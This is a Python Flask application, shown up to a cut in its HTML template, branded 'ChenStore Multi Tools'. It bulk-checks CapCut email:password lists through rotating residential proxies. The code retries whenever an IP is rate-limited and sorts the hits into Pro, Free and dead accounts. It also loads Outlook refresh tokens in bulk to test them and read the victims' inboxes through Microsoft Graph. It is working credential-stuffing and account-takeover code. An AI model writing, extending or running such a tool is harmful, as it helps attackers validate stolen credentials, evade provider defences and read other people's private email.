"""ChenStore Multi Tools Dashboard: CapCut & Outlook Webmail Reader.
Self-contained single file for Vercel Serverless Function deployment.
"""
import json
import os
import re
import random
import string
import datetime
from datetime import timezone
from typing import Dict, Any, Tuple, Optional, List
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, Response, render_template_string, request, jsonify, send_from_directory
import requests

app = Flask(__name__)

# ==================== CAPCUT CORE LOGIC ====================
CAPCUT_AID = "348188"
LOGIN_HOST = "login-row.www.capcut.com"
SUB_URL = "https://commerce-api-sg.capcut.com/commerce/v3/trade/subscription_infos"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
_WEB_HDR = {"Referer": "https://www.capcut.com/", "Origin": "https://www.capcut.com"}

def _enc(s):
    return "".join("%02x" % (ord(c) ^ 5) for c in str(s))

def _sess_id(n=18):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def _proxies(template, sid):
    if not template:
        return None
    url = template.replace("{sess}", sid)
    return {"http": url, "https": url}

def _logout(s, timeout=15):
    try:
        csrf = s.cookies.get("passport_csrf_token", "")
        s.post("https://%s/passport/user/logout/?aid=%s&account_sdk_source=web" % (LOGIN_HOST, CAPCUT_AID),
               headers={**_WEB_HDR, "x-tt-passport-csrf-token": csrf}, timeout=timeout)
    except Exception:
        pass

def check_capcut_account(email, password, proxy_template=None, max_ip_retries=6, timeout=30):
    email = (email or "").strip()
    password = (password or "").strip()
    out = {"ok": False, "email": email, "user_id": "", "plan": "", "expiry": "",
           "is_pro": False, "error": ""}
    if not email or not password:
        out["error"] = "missing email/password"
        return out
    last_err = "login failed"
    for _ in range(max(1, int(max_ip_retries or 1))):
        sid = _sess_id()
        s = requests.Session()
        prox = _proxies(proxy_template, sid)
        if prox:
            s.proxies = prox
        s.headers.update({"User-Agent": UA})
        try:
            url = ("https://%s/passport/web/email/login/?aid=%s&account_sdk_source=web"
                   "&language=en&verifyFp=verify_%s&device_platform=web"
                   % (LOGIN_HOST, CAPCUT_AID, sid))
            data = {"mix_mode": "1", "email": _enc(email), "password": _enc(password),
                    "fixed_mix_mode": "1"}
            hdr = dict(_WEB_HDR); hdr["Content-Type"] = "application/x-www-form-urlencoded"
            r = s.post(url, data=data, headers=hdr, timeout=timeout)
            try:
                j = r.json()
            except Exception:
                last_err = "login: unreadable response"
                continue
            dd = j.get("data") or {}
            if "sessionid" not in s.cookies.get_dict():
                ec = dd.get("error_code")
                if ec == 7:
                    last_err = "IP rate-limited"
                    continue
                if dd.get("captcha"):
                    out["error"] = "captcha required"
                    return out
                out["error"] = "login failed: %s" % (dd.get("description")
                                                     or j.get("message") or "invalid credentials")
                return out
            out["user_id"] = dd.get("user_id_str") or (str(dd.get("user_id")) if dd.get("user_id") else "")
            body = {"scene": ["vip", "workspace"], "vip_levels": ["vip"], "app_id": int(CAPCUT_AID)}
            hdr2 = dict(_WEB_HDR); hdr2["Content-Type"] = "application/json"
            sr = s.post(SUB_URL, json=body, headers=hdr2, timeout=timeout)
            sj = sr.json()
            vip = ((((sj.get("data") or {}).get("subscription_user_infos") or {})
                    .get("vip") or {}).get("vip_infos")) or []
            if vip and vip[0].get("is_vip"):
                info = vip[0]
                out["is_pro"] = True
                out["plan"] = "Pro (%s)" % (info.get("vip_level") or "vip")
                end = info.get("vip_end_time")
                try:
                    end = int(end)
                except (TypeError, ValueError):
                    end = 0
                out["expiry"] = (datetime.datetime.fromtimestamp(end, datetime.timezone.utc)
                                 .strftime("%Y-%m-%d")) if end > 0 else "lifetime"
            else:
                out["plan"] = "Free"
                out["expiry"] = "-"
            _logout(s)
            out["ok"] = True
            return out
        except Exception:
            last_err = "network/proxy error"
            continue
    out["error"] = last_err
    return out

_CC_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
def parse_capcut_accounts(text: str) -> list:
    out = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = _CC_EMAIL_RE.search(line)
        if not m:
            continue
        email = m.group(0).lower()
        tail = line[m.end():].lstrip(" \t:,|=-")
        if not tail:
            continue
        pw = re.split(r"[\s,:|]+", tail)[0]
        if not pw:
            continue
        key = (email, pw)
        if key in seen:
            continue
        seen.add(key)
        out.append(key)
    return out

# ==================== OUTLOOK CORE LOGIC ====================
DEFAULT_CLIENT_ID = "9e5f94bc-e8a4-4e73-b8be-63364c29d753"
INBOX_MESSAGES_URL = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages"
SINGLE_MESSAGE_URL = "https://graph.microsoft.com/v1.0/me/messages"
TOKEN_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"

ERROR_MESSAGES = {
    "AADSTS70000": "Token tidak valid, kedaluwarsa, atau rusak.",
    "AADSTS700016": "Client ID tidak ditemukan di Azure AD.",
    "AADSTS700038": "Client ID tidak valid.",
    "AADSTS90023": "Aplikasi tidak memiliki izin untuk mengakses resource ini.",
    "AADSTS50173": "Sesi token kedaluwarsa. Perlu generate token baru.",
    "AADSTS900232": "Aplikasi tidak diizinkan untuk tipe akun ini.",
}

_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
_CLIENT_ID_RE = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")

def parse_outlook_lines(text: str) -> List[Dict[str, str]]:
    results = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "|" in line:
            parts = [p.strip() for p in line.split("|") if p.strip()]
        elif "----" in line:
            parts = [p.strip() for p in line.split("----") if p.strip()]
        elif "\t" in line:
            parts = [p.strip() for p in line.split("\t") if p.strip()]
        else:
            parts = [p.strip() for p in re.split(r"[:;\s]+", line) if p.strip()]

        if not parts:
            continue
        email = ""
        password = ""
        token = ""
        client_id = DEFAULT_CLIENT_ID
        email_match = _EMAIL_RE.search(line)
        if email_match:
            email = email_match.group(0).strip()
        for p in parts:
            if _CLIENT_ID_RE.match(p):
                client_id = p
                break
        for p in parts:
            if p.startswith("M.") or (len(p) > 50 and p != email and p != client_id):
                token = p
                break
        if not token:
            if len(parts) >= 3 and parts[0] == email:
                token = parts[2] if len(parts) >= 4 else parts[1]
                password = parts[1] if len(parts) >= 4 else ""
            elif len(parts) == 1 and (parts[0].startswith("M.") or len(parts[0]) > 40):
                token = parts[0]
        if not token:
            continue
        if not password and len(parts) >= 2 and parts[0] == email and parts[1] != token:
            password = parts[1]
        key = f"{email}_{token[:20]}"
        if key in seen:
            continue
        seen.add(key)
        results.append({
            "email": email or "Unknown Email",
            "password": password,
            "refresh_token": token,
            "client_id": client_id
        })
    return results

def get_access_token(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
    client_id = client_id or DEFAULT_CLIENT_ID
    proxies = {"http": proxy, "https": proxy} if proxy else None
    data = {
        "grant_type": "refresh_token",
        "client_id": client_id,
        "refresh_token": refresh_token,
        "scope": "https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/User.Read"
    }
    try:
        r = requests.post(TOKEN_URL, data=data, proxies=proxies, timeout=10)
        res_json = r.json()
    except Exception as e:
        return None, f"Network / Proxy error: {str(e)}"

    if r.status_code != 200:
        err_desc = res_json.get("error_description") or res_json.get("error") or r.text[:120]
        for code, msg in ERROR_MESSAGES.items():
            if code in err_desc:
                err_desc = f"[{code}] {msg}"
                break
        return None, err_desc

    access_token = res_json.get("access_token")
    if not access_token:
        return None, "Access token tidak ditemukan dalam respon"
    return access_token, None

def check_outlook_account(email: str, password: str, refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Dict[str, Any]:
    out = {
        "ok": False,
        "email": email,
        "password": password,
        "client_id": client_id or DEFAULT_CLIENT_ID,
        "refresh_token": refresh_token,
        "status": "DEAD",
        "unread_count": 0,
        "latest_subject": "",
        "latest_from": "",
        "latest_date": "",
        "error": ""
    }
    access_token, err = get_access_token(refresh_token, client_id, proxy)
    if not access_token:
        out["error"] = err
        return out

    headers = {"Authorization": f"Bearer {access_token}"}
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        if not email or email == "Unknown Email":
            me_res = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers, proxies=proxies, timeout=10)
            if me_res.status_code == 200:
                me_data = me_res.json()
                out["email"] = me_data.get("mail") or me_data.get("userPrincipalName") or email

        params = {
            "$orderby": "receivedDateTime desc",
            "$top": "1",
            "$select": "id,subject,from,receivedDateTime,isRead"
        }
        inbox_res = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=10)
        if inbox_res.status_code == 200:
            inbox_data = inbox_res.json().get("value", [])
            if inbox_data:
                latest = inbox_data[0]
                out["latest_subject"] = latest.get("subject") or "(Tanpa Subjek)"
                sender = latest.get("from", {}).get("emailAddress", {})
                out["latest_from"] = sender.get("name") or sender.get("address") or "Unknown"
                out["latest_date"] = (latest.get("receivedDateTime") or "")[:10]
    except Exception:
        pass

    out["ok"] = True
    out["status"] = "LIVE"
    return out

def fetch_inbox_messages(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None, top: int = 30) -> Dict[str, Any]:
    access_token, err = get_access_token(refresh_token, client_id, proxy)
    if not access_token:
        return {"ok": False, "error": err, "messages": []}

    headers = {"Authorization": f"Bearer {access_token}"}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    params = {
        "$orderby": "receivedDateTime desc",
        "$top": str(max(1, min(100, top))),
        "$select": "id,subject,from,receivedDateTime,bodyPreview,isRead"
    }

    try:
        r = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=10)
        if r.status_code != 200:
            return {"ok": False, "error": f"HTTP {r.status_code}: {r.text[:120]}", "messages": []}

        data = r.json()
        raw_items = data.get("value", [])
        messages = []
        for item in raw_items:
            sender_obj = item.get("from", {}).get("emailAddress", {})
            sender_name = sender_obj.get("name") or sender_obj.get("address") or "Unknown"
            sender_addr = sender_obj.get("address") or ""

            raw_dt = item.get("receivedDateTime", "")
            time_display = raw_dt[:10]
            try:
                dt = datetime.datetime.fromisoformat(raw_dt.replace("Z", "+00:00"))
                now = datetime.datetime.now(timezone.utc)
                diff = now - dt
                if diff.total_seconds() < 3600:
                    mins = max(1, int(diff.total_seconds() // 60))
                    time_display = f"{mins}m ago"
                elif diff.total_seconds() < 86400:
                    hrs = int(diff.total_seconds() // 3600)
                    time_display = f"{hrs}h ago"
                elif diff.days == 1:
                    time_display = "Yesterday"
                elif diff.days < 7:
                    time_display = f"{diff.days}d ago"
                else:
                    time_display = dt.strftime("%d %b %Y")
            except Exception:
                pass

            messages.append({
                "id": item.get("id"),
                "subject": item.get("subject") or "(Tanpa Subjek)",
                "sender_name": sender_name,
                "sender_email": sender_addr,
                "preview": item.get("bodyPreview") or "",
                "time_display": time_display,
                "raw_date": raw_dt,
                "is_read": item.get("isRead", True)
            })

        return {"ok": True, "messages": messages}
    except Exception as e:
        return {"ok": False, "error": str(e), "messages": []}

def fetch_message_detail(message_id: str, refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Dict[str, Any]:
    access_token, err = get_access_token(refresh_token, client_id, proxy)
    if not access_token:
        return {"ok": False, "error": err}

    headers = {"Authorization": f"Bearer {access_token}"}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    url = f"{SINGLE_MESSAGE_URL}/{message_id}"
    params = {"$select": "id,subject,from,toRecipients,receivedDateTime,body"}

    try:
        r = requests.get(url, headers=headers, params=params, proxies=proxies, timeout=25)
        if r.status_code != 200:
            return {"ok": False, "error": f"HTTP {r.status_code}: {r.text[:120]}"}

        data = r.json()
        sender_obj = data.get("from", {}).get("emailAddress", {})
        sender_str = f"{sender_obj.get('name', '')} <{sender_obj.get('address', '')}>" if sender_obj.get('name') else sender_obj.get('address', 'Unknown')

        to_recipients = data.get("toRecipients", [])
        to_str = ", ".join([t.get("emailAddress", {}).get("address", "") for t in to_recipients if t.get("emailAddress")])

        body_obj = data.get("body", {})
        body_content = body_obj.get("content", "")
        body_type = body_obj.get("contentType", "text")

        raw_dt = data.get("receivedDateTime", "")
        formatted_date = raw_dt
        try:
            dt = datetime.datetime.fromisoformat(raw_dt.replace("Z", "+00:00"))
            formatted_date = dt.strftime("%d %b %Y, %H:%M")
        except Exception:
            pass

        return {
            "ok": True,
            "id": data.get("id"),
            "subject": data.get("subject") or "(Tanpa Subjek)",
            "from": sender_str,
            "to": to_str,
            "date": formatted_date,
            "body": body_content,
            "body_type": body_type
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ==================== HTML TEMPLATE ====================
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ChenStore | MULTI TOOLS</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');

    :root {
      --bg-wood-dark: #0f0a06;
      --bg-card: #18110b;
      --bg-card-secondary: #221810;
      --border-bronze: #452e1d;
      --border-gold: #b45309;
      --gold-main: #f59e0b;
      --gold-light: #fef08a;
      --gold-glow: rgba(245, 158, 11, 0.35);
      --text-main: #fef3c7;
      --text-muted: #a89f91;
      --dot-green: #22c55e;
      --dot-red: #ef4444;
    }

    body {
      background-color: var(--bg-wood-dark);
      background-image: 
        radial-gradient(circle at 15% 15%, rgba(180, 83, 9, 0.12) 0%, transparent 40%),
        radial-gradient(circle at 85% 85%, rgba(217, 119, 6, 0.08) 0%, transparent 45%);
      color: var(--text-main);
      font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }

    .top-navbar {
      background-color: #140d07;
      border-bottom: 2px solid #382415;
      padding: 8px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 68px;
      flex-shrink: 0;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    }

    .brand-title {
      font-family: 'Cinzel', serif;
      font-weight: 800;
      font-size: 1.25rem;
      letter-spacing: 1.5px;
      background: linear-gradient(180deg, #fffbeb 0%, #fcd34d 50%, #d97706 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 2px 10px rgba(217, 119, 6, 0.3);
    }
    .brand-sub {
      font-size: 0.72rem;
      letter-spacing: 2px;
      color: #b45309;
      font-weight: 700;
      text-transform: uppercase;
    }

    .nav-tabs-custom {
      background: #0d0805;
      padding: 4px;
      border-radius: 10px;
      border: 1px solid #382415;
    }
    .nav-tabs-custom .nav-link {
      color: var(--text-muted);
      border: none;
      font-weight: 600;
      font-size: 0.88rem;
      padding: 8px 20px;
      border-radius: 8px;
      background: transparent;
      transition: all 0.2s ease;
    }
    .nav-tabs-custom .nav-link:hover {
      color: var(--gold-light);
      background-color: #24160d;
    }
    .nav-tabs-custom .nav-link.active {
      color: #1a0f05;
      font-weight: 700;
      background: linear-gradient(135deg, #fcd34d 0%, #f59e0b 50%, #d97706 100%);
      box-shadow: 0 2px 12px var(--gold-glow);
    }

    .main-tab-content {
      flex: 1;
      overflow: hidden;
      display: flex;
    }

    .tab-pane-custom {
      width: 100%;
      height: 100%;
      display: none;
    }
    .tab-pane-custom.active {
      display: flex;
    }

    .trackmail-container {
      display: flex;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }

    .tm-sidebar {
      width: 290px;
      background-color: #120c08;
      border-right: 1px solid #2d1c10;
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
    }
    .tm-sidebar-header {
      padding: 14px 18px;
      border-bottom: 1px solid #2d1c10;
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #170f0a;
    }
    .tm-accounts-list {
      flex: 1;
      overflow-y: auto;
      padding: 10px;
    }
    .tm-account-item {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 10px 12px;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 5px;
      border: 1px solid transparent;
      background: #18110b;
      transition: all 0.15s;
    }
    .tm-account-item:hover {
      background-color: #261a11;
      border-color: #5c3b1e;
    }
    .tm-account-item.active {
      background-color: #2d1d13;
      border-color: #d97706;
      box-shadow: 0 0 10px rgba(217, 119, 6, 0.2);
    }
    .tm-avatar {
      width: 32px;
      height: 32px;
      border-radius: 6px;
      background: linear-gradient(135deg, #452e1d, #2b1a0d);
      border: 1px solid #78471c;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 0.85rem;
      color: #fef3c7;
      flex-shrink: 0;
    }
    .status-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      display: inline-block;
    }
    .status-dot.live { background-color: var(--dot-green); box-shadow: 0 0 8px rgba(34, 197, 94, 0.7); }
    .status-dot.dead { background-color: var(--dot-red); box-shadow: 0 0 8px rgba(239, 68, 68, 0.7); }

    .tm-messages-col {
      width: 360px;
      background-color: #140d08;
      border-right: 1px solid #2d1c10;
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
    }
    .tm-messages-header {
      padding: 14px 18px;
      border-bottom: 1px solid #2d1c10;
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #170f0a;
    }
    .tm-messages-list {
      flex: 1;
      overflow-y: auto;
      padding: 10px;
    }
    .tm-message-item {
      padding: 12px;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 6px;
      border: 1px solid #2d1c10;
      background-color: #19110b;
      transition: all 0.15s;
    }
    .tm-message-item:hover {
      background-color: #271a11;
      border-color: #5c3b1e;
    }
    .tm-message-item.active {
      border-color: #f59e0b;
      background-color: #2b1d13;
      box-shadow: 0 0 10px rgba(245, 158, 11, 0.2);
    }
    .tm-unread-dot {
      width: 6px;
      height: 6px;
      background-color: #f59e0b;
      border-radius: 50%;
      display: inline-block;
      margin-right: 6px;
      box-shadow: 0 0 6px rgba(245, 158, 11, 0.8);
    }

    .tm-reader-col {
      flex: 1;
      background-color: #0f0a06;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }
    .tm-reader-topbar {
      padding: 12px 24px;
      border-bottom: 1px solid #2d1c10;
      display: flex;
      align-items: center;
      justify-content: space-between;
      background-color: #170f0a;
    }
    .tm-reader-content {
      flex: 1;
      overflow-y: auto;
      padding: 24px;
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    .tm-meta-card {
      background-color: #18110b;
      border: 1px solid #382415;
      border-radius: 10px;
      padding: 18px 22px;
    }
    .tm-email-iframe {
      width: 100%;
      min-height: 550px;
      border: 1px solid #382415;
      border-radius: 10px;
      background-color: #ffffff;
      flex: 1;
    }

    .capcut-container {
      width: 100%;
      height: 100%;
      overflow-y: auto;
      padding: 28px 36px;
    }
    .card-theme {
      background-color: #18110b;
      border: 1px solid #382415;
      border-radius: 12px;
    }
    .form-control-theme {
      background-color: #0f0a06;
      border: 1px solid #382415;
      color: #fef3c7;
    }
    .form-control-theme:focus {
      background-color: #0f0a06;
      border-color: #d97706;
      color: #fef3c7;
      box-shadow: 0 0 0 0.25rem rgba(217, 119, 6, 0.25);
    }
    .btn-gold {
      background: linear-gradient(135deg, #d97706 0%, #f59e0b 100%);
      color: #180f07;
      font-weight: 700;
      border: none;
      transition: all 0.2s;
    }
    .btn-gold:hover {
      background: linear-gradient(135deg, #b45309 0%, #d97706 100%);
      color: #ffffff;
      box-shadow: 0 0 14px var(--gold-glow);
    }
    .btn-outline-gold {
      border: 1px solid #b45309;
      color: #fcd34d;
    }
    .btn-outline-gold:hover {
      background-color: #2b1d13;
      border-color: #f59e0b;
      color: #ffffff;
    }
  </style>
</head>
<body>

  <div class="top-navbar">
    <div class="d-flex align-items-center gap-3">
      <img src="/logo.png" alt="ChenStore" style="height: 46px; border-radius: 8px; border: 1px solid #78471c; box-shadow: 0 2px 8px rgba(0,0,0,0.5);" onerror="this.style.display='none'">
      <div>
        <div class="brand-title">ChenStore</div>
        <div class="brand-sub">MULTI TOOLS • LAYANAN SOSMED</div>
      </div>
    </div>
    
    <ul class="nav nav-tabs-custom" id="mainTabs">
      <li class="nav-item">
        <button class="nav-link active" id="btn-tab-mail" onclick="switchTab('mail')">
          <i class="fa-solid fa-inbox me-2 text-warning"></i>Mail Checker (Webmail)
        </button>
      </li>
      <li class="nav-item">
        <button class="nav-link" id="btn-tab-capcut" onclick="switchTab('capcut')">
          <i class="fa-solid fa-film me-2 text-warning"></i>CapCut Checker
        </button>
      </li>
    </ul>
  </div>

  <div class="main-tab-content">
    
    <div id="tab-mail" class="tab-pane-custom active">
      <div class="trackmail-container">
        
        <div class="tm-sidebar">
          <div class="tm-sidebar-header">
            <span class="small fw-bold text-uppercase text-warning" style="letter-spacing: 0.5px;">
              <i class="fa-solid fa-users-viewfinder me-1"></i> Accounts (<span id="tmAccountCount">0</span>)
            </span>
            <div class="d-flex gap-2">
              <button class="btn btn-sm btn-outline-secondary p-1" title="Clear All" onclick="clearAllOutlookAccounts()">
                <i class="fa-solid fa-trash-can fa-xs text-danger"></i>
              </button>
            </div>
          </div>

          <div class="tm-accounts-list" id="tmAccountsContainer">
            <div class="text-center text-muted py-5 small">
              Belum ada akun.<br>Klik <b>+ Add Account</b> di bawah.
            </div>
          </div>

          <div class="p-3 border-top border-secondary" style="background: #140d07;">
            <button class="btn btn-gold w-100 py-2 btn-sm" data-bs-toggle="modal" data-bs-target="#addAccountModal">
              <i class="fa-solid fa-plus me-1"></i> Add Account
            </button>
          </div>
        </div>

        <div class="tm-messages-col">
          <div class="tm-messages-header">
            <span class="fw-bold small text-uppercase text-warning" id="tmInboxTitle">
              <i class="fa-regular fa-folder-open me-1"></i> INBOX (0)
            </span>
            <button class="btn btn-sm btn-outline-gold py-0 px-2" onclick="refreshCurrentInbox()" title="Refresh Inbox">
              <i class="fa-solid fa-rotate-right fa-xs"></i>
            </button>
          </div>
          <div class="tm-messages-list" id="tmMessagesContainer">
            <div class="text-center text-muted py-5 small">
              Pilih akun di sebelah kiri untuk melihat pesan inbox.
            </div>
          </div>
        </div>

        <div class="tm-reader-col">
          <div class="tm-reader-topbar">
            <div class="d-flex align-items-center gap-3">
              <span class="fw-semibold text-truncate text-warning" id="tmActiveEmailLabel" style="max-width: 320px;">Pilih Akun</span>
              <span id="tmConnectionBadge" class="badge bg-dark border border-secondary text-secondary px-2 py-1">
                ● Standby
              </span>
            </div>
            <div class="d-flex gap-2">
              <button class="btn btn-sm btn-outline-gold" onclick="copyCurrentEmail()" title="Copy Email">
                <i class="fa-regular fa-copy me-1"></i> Copy Email
              </button>
              <button class="btn btn-sm btn-outline-gold" onclick="refreshCurrentInbox()" title="Refresh">
                <i class="fa-solid fa-arrows-rotate"></i>
              </button>
            </div>
          </div>

          <div class="tm-reader-content" id="tmReaderContent">
            <div class="text-center text-muted my-auto">
              <i class="fa-regular fa-envelope-open fa-3x mb-3 text-warning"></i>
              <h5 class="text-light">Belum ada email yang dipilih</h5>
              <p class="small text-secondary">Klik salah satu email dari daftar inbox untuk membaca isi surat.</p>
            </div>
          </div>
        </div>

      </div>
    </div>

    <div id="tab-capcut" class="tab-pane-custom">
      <div class="capcut-container">
        <div class="row g-4">
          
          <div class="col-lg-5">
            <div class="card card-theme p-4 shadow-sm">
              <h5 class="fw-bold mb-3 text-warning"><i class="fa-solid fa-film me-2"></i>Input Akun CapCut</h5>
              
              <div class="mb-3">
                <label class="form-label text-secondary small fw-semibold">DAFTAR AKUN (email:pass, email|pass, dll)</label>
                <textarea id="ccAccountsInput" class="form-control form-control-theme" rows="7" placeholder="user1@example.com:password123&#10;user2@example.com|password456"></textarea>
                <div class="d-flex justify-content-between mt-1">
                  <small id="ccAccountCount" class="text-muted">Total: 0 akun</small>
                  <button class="btn btn-sm btn-link text-decoration-none p-0 text-danger" onclick="document.getElementById('ccAccountsInput').value=''; updateCapcutCount();">Clear</button>
                </div>
              </div>

              <div class="mb-3">
                <label class="form-label text-secondary small fw-semibold">RESIDENTIAL PROXY URL (Wajib)</label>
                <input type="text" id="ccProxyInput" class="form-control form-control-theme" placeholder="http://user-session-{sess}:pass@gate.provider.com:7000" value="{{ default_proxy }}">
                <small class="text-muted" style="font-size: 0.75rem;">Gunakan token <code>{sess}</code> untuk rotasi IP otomatis.</small>
              </div>

              <div class="row g-2 mb-3">
                <div class="col-6">
                  <label class="form-label text-secondary small fw-semibold">THREADS</label>
                  <input type="number" id="ccWorkersInput" class="form-control form-control-theme" value="6" min="1" max="25">
                </div>
                <div class="col-6">
                  <label class="form-label text-secondary small fw-semibold">IP RETRIES</label>
                  <input type="number" id="ccRetriesInput" class="form-control form-control-theme" value="6" min="1" max="15">
                </div>
              </div>

              <div class="d-flex gap-2">
                <button id="btnStartCapcut" class="btn btn-gold flex-grow-1 py-2" onclick="startCapcutChecking()">
                  <i class="fa-solid fa-play me-2"></i>Mulai Check CapCut
                </button>
                <button id="btnStopCapcut" class="btn btn-outline-secondary py-2" onclick="stopCapcutChecking()" disabled>
                  <i class="fa-solid fa-stop me-2"></i>Stop
                </button>
              </div>

              <div class="mt-4">
                <div class="d-flex justify-content-between small text-secondary mb-1">
                  <span>Progress</span>
                  <span id="ccProgressText" class="text-warning">0 / 0 (0%)</span>
                </div>
                <div class="progress" style="height: 6px; background-color: #0f0a06;">
                  <div id="ccProgressBar" class="progress-bar bg-warning" style="width: 0%;"></div>
                </div>
              </div>
            </div>
          </div>

          <div class="col-lg-7">
            <div class="card card-theme p-4 shadow-sm">
              <div class="d-flex justify-content-between align-items-center mb-3">
                <h5 class="fw-bold mb-0 text-warning"><i class="fa-solid fa-square-poll-vertical me-2"></i>Hasil Pengecekan CapCut</h5>
                <div class="d-flex gap-2">
                  <button class="btn btn-sm btn-outline-gold" onclick="downloadCapcutAll('csv')">
                    <i class="fa-solid fa-file-csv me-1"></i>CSV
                  </button>
                  <button class="btn btn-sm btn-outline-gold" onclick="downloadCapcutAll('txt')">
                    <i class="fa-solid fa-file-lines me-1"></i>TXT
                  </button>
                </div>
              </div>

              <div class="mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <span class="fw-bold text-success">
                    <i class="fa-solid fa-crown me-1"></i>PRO / VIP 
                    <span id="proCount" class="badge bg-success badge-counter ms-1">0</span>
                  </span>
                  <div class="btn-group btn-group-sm">
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('proResult')">Copy</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('proResult', 'capcut_pro.txt')">Save</button>
                  </div>
                </div>
                <textarea id="proResult" class="form-control form-control-theme border-success" rows="4" readonly placeholder="Akun PRO akan muncul di sini..."></textarea>
              </div>

              <div class="mb-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <span class="fw-bold text-info">
                    <i class="fa-solid fa-user me-1"></i>FREE / REGULAR
                    <span id="freeCount" class="badge bg-info text-dark badge-counter ms-1">0</span>
                  </span>
                  <div class="btn-group btn-group-sm">
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('freeResult')">Copy</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('freeResult', 'capcut_free.txt')">Save</button>
                  </div>
                </div>
                <textarea id="freeResult" class="form-control form-control-theme border-info" rows="4" readonly placeholder="Akun FREE akan muncul di sini..."></textarea>
              </div>

              <div>
                <div class="d-flex justify-content-between align-items-center mb-1">
                  <span class="fw-bold text-danger">
                    <i class="fa-solid fa-circle-xmark me-1"></i>DEAD / ERROR
                    <span id="dieCount" class="badge bg-danger badge-counter ms-1">0</span>
                  </span>
                  <div class="btn-group btn-group-sm">
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="copyField('dieResult')">Copy</button>
                    <button class="btn btn-sm btn-outline-secondary text-light" onclick="downloadField('dieResult', 'capcut_die.txt')">Save</button>
                  </div>
                </div>
                <textarea id="dieResult" class="form-control form-control-theme border-danger" rows="3" readonly placeholder="Akun Gagal akan muncul di sini..."></textarea>
              </div>

            </div>
          </div>

        </div>
      </div>
    </div>

  </div>

  <div class="modal fade" id="addAccountModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content card-theme border-warning text-light">
        <div class="modal-header border-secondary">
          <h5 class="modal-title fw-bold text-warning"><i class="fa-solid fa-user-plus me-2"></i>Add Outlook / Hotmail Accounts</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
        </div>
        <div class="modal-body">
          <label class="form-label small text-secondary fw-semibold">PASTE TOKENS (email|pass|refresh_token|client_id atau token saja)</label>
          <textarea id="modalAccountInput" class="form-control form-control-theme" rows="7" placeholder="user@hotmail.com|password|M.R3_BAY...|9e5f94bc-e8a4-4e73-b8be-63364c29d753"></textarea>
          
          <div class="mt-3">
            <label class="form-label small text-secondary fw-semibold">PROXY (Opsional: http://user:pass@host:port)</label>
            <input type="text" id="modalProxyInput" class="form-control form-control-theme" placeholder="Kosongkan jika direct">
          </div>
        </div>
        <div class="modal-footer border-secondary">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
